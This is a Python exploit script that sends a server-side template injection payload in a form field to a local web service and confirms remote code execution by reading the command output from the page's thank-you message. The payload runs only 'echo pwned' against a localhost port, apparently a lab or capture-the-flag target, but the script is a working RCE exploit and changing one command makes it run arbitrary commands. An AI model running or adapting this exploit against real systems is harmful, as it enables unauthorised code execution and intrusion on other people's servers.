import requests
import re
import sys

def exploit():
    url = "http://127.0.0.1:33126/submit"
    
    print("[+] SSTI Exploitation")
    print(f"[+] Target: {url}")
    print("[+] Testing RCE via SSTI...")
    
    # Simple RCE test
    test_payload = '{{ __import__("os").popen("echo pwned").read() }}'
    data = {'name': test_payload, 'email': 'test@example.com', 'license': 'D123456'}
    
    try:
        resp = requests.post(url, data=data, timeout=3)
        print(f"[+] Status: {resp.status_code}")
        print(f"[+] Response length: {len(resp.text)} bytes")
        
        if resp.status_code == 200:
            # Extract output from "Thank you [output] for your submission."
            match = re.search(r'Thank you (.*?) for your submission', resp.text, re.DOTALL)
            if match:
                output = match.group(1)
                print(f"[+] Command output: {output[:200]}")
                
                if 'pwned' in output:
                    print("[+] RCE confirmed!")
                    return True
    except Exception as e:
        print(f"[!] Error: {e}")
    
    return False

def main():
    if exploit():
        print("\n[!] Successfully exploited SSTI for RCE")
    else:
        print("\n[!] Exploitation failed")
        sys.exit(1)

if __name__ == '__main__':
    main()
